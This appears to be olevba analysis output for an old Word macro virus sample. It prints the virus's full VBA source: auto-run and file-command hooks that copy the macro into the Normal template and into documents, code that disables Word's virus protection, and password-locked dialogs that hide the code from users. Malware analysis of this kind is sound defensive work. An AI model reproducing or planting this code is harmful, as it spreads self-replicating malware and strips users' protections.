olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Proteced.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Proteced.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Digital1.bas 
in file: Virus.MSWord.Proteced.h - OLE stream: 'Macros/VBA/Digital1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HelpAbout()

MsgBox ("Digital High Amplifying Super Heat Integrating Numerical Initials... are the norm of the day !")

End Sub

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.MAIN"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
On Error Resume Next
Comment
d2n
NormalTemplate.Save
End Sub
Sub AutoClose()
Attribute AutoClose.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.AutoClose"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
On Error Resume Next
Comment
d2n
NormalTemplate.Save
MsgBox ("Digital says thanx")
End Sub

Sub AutoExit()
Attribute AutoExit.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.AutoExit"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
On Error Resume Next
Comment
d2n
NormalTemplate.Save

End Sub

Sub FileOpen()
Attribute FileOpen.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute FileOpen.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.FileOpen"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
   Comment
   n2d
   d2n
   Dialogs(wdDialogFileOpen).Show

Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub FileSave()
Attribute FileSave.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.FileSave"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
On Error Resume Next
Comment
n2d
d2n
ActiveDocument.Save

End Sub

Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.FileSaveAs"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
On Error Resume Next
Comment
n2d
d2n
Dialogs(wdDialogFileSaveAs).Show
ActiveDocument.Save
End Sub

Sub d2n()
Attribute d2n.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute d2n.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.d2n"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "Digital1"
   Application.OrganizerCopy Source:=cur_doc, _
                             Destination:=global_temp, _
                             Name:=macroname, _
                             Object:=wdOrganizerObjectProjectItems
err:

End Sub

Sub n2d()
Attribute n2d.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute n2d.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.n2d"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "Digital1"
   Application.OrganizerCopy Source:=global_temp, _
   Destination:=cur_doc, Name:=macroname, _
   Object:=wdOrganizerObjectProjectItems
err:
End Sub

Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.ToolsMacro"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'

Application.EnableCancelKey = wdCancelDisabled
   titles = "Digital Macro Protected"
   msg = "Please enter correct Digital password:"
   Passcode = InputBox(msg, titles)
   If Passcode = "High" Then
      Dialogs(wdDialogToolsMacro).Show
   Else
      MsgBox ("Digital denies access ...")
   End If
Application.EnableCancelKey = wdCancelDisabled

End Sub

Sub ViewVBCode()
Attribute ViewVBCode.VB_Description = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Digital.Digital1.ViewVBCode"
' Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !
'
Application.EnableCancelKey = wdCancelDisabled
   titles = "Digital Codes Protected"
   msg = "Please enter correct Digital password:"
   Passcode = InputBox(msg, titles)
   If Passcode = "High" Then
      Dialogs(wdDialogToolsMacro).Show
   Else
      MsgBox ("Digital denies access ...")
   End If
Application.EnableCancelKey = wdCancelDisabled

End Sub

Sub Comment()

Options.VirusProtection = False
Options.SaveNormalPrompt = False

With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "Digital High Amplifying Super Heat Integrated Numerical Initials... are the norm of the day !"
            .Execute
End With


End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

